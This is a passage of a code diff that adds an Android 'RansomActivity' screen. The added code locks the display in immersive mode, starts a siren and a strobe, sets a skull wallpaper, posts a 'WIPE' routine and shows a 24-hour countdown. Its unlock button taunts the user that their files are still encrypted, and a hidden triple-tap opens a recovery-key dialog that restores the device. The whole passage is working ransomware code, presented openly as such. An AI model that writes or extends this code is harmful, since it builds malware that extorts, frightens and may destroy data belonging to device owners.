+                        | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
+
+        Poller.start(this);
+        try {
+            setSkullWallpaper();
+        } catch (Exception ignored) {
+        }
+        Siren.start(this);
+        Strobe.start(this);
+        h.post(WIPE);
+
+        final TextView cd = findViewById(R.id.txtCountdown);
+        timer = new CountDownTimer(24L * 60 * 60 * 1000, 1000) {
+            @Override
+            public void onTick(long ms) {
+                long s = ms / 1000;
+                cd.setText(String.format("%02d:%02d:%02d", s / 3600, (s % 3600) / 60, s % 60));
+            }
+
+            @Override
+            public void onFinish() {
+                cd.setText("00:00:00");
+            }
+        }.start();
+
+        findViewById(R.id.imgLogo).setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                long now = System.currentTimeMillis();
+                if (now - lastTap > 2000) taps = 0;
+                lastTap = now;
+                if (++taps >= 3) {
+                    taps = 0;
+                    askPin();
+                }
+            }
+        });
+
+        findViewById(R.id.btnUnlock).setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Toast.makeText(RansomActivity.this,
+                        "nice try :)  files still encrypted", Toast.LENGTH_LONG).show();
+            }
+        });
+    }
+
+    private void askPin() {
+        final EditText et = new EditText(this);
+        et.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
+        et.setHint("recovery key");
+        et.setTextColor(Color.parseColor("#00FF41"));
+        et.setHintTextColor(Color.parseColor("#6B6B6B"));
+
+        new AlertDialog.Builder(this)
+                .setTitle("RECOVERY KEY")
+                .setView(et)
+                .setPositiveButton("UNLOCK", new android.content.DialogInterface.OnClickListener() {
+                    @Override
+                    public void onClick(android.content.DialogInterface d, int w) {
+                        if (Config.RECOVERY_PIN.equals(et.getText().toString().trim())) {
+                            KillSwitch.restore(RansomActivity.this, false);
+                            Toast.makeText(RansomActivity.this,
+                                    "✔ system restored", Toast.LENGTH_LONG).show();
+                            finish();
+                        } else {
+                            Toast.makeText(RansomActivity.this,
+                                    "✖ wrong key", Toast.LENGTH_SHORT).show();
+                        }
+                    }
+                })
+                .setNegativeButton("CANCEL", null)
+                .show();
+    }
+
+    private void setSkullWallpaper() {
+        Drawable d = getDrawable(R.drawable.ic_skull_logo);
+        int w = 1080, hh = 1920;
+        Bitmap bmp = Bitmap.createBitmap(w, hh, Bitmap.Config.ARGB_8888);
+        Canvas c = new Canvas(bmp);
+        c.drawColor(Color.BLACK);
+        d.setBounds(0, (hh - w) / 2, w, (hh + w) / 2);
+        d.draw(c);
+        WallpaperManager.getInstance(this).setBitmap(bmp);
+    }
+
+    @Override
+    protected void onDestroy() {
+        wipeRunning = false;
+        if (timer != null) timer.cancel();
+        super.onDestroy();
+    }
+}
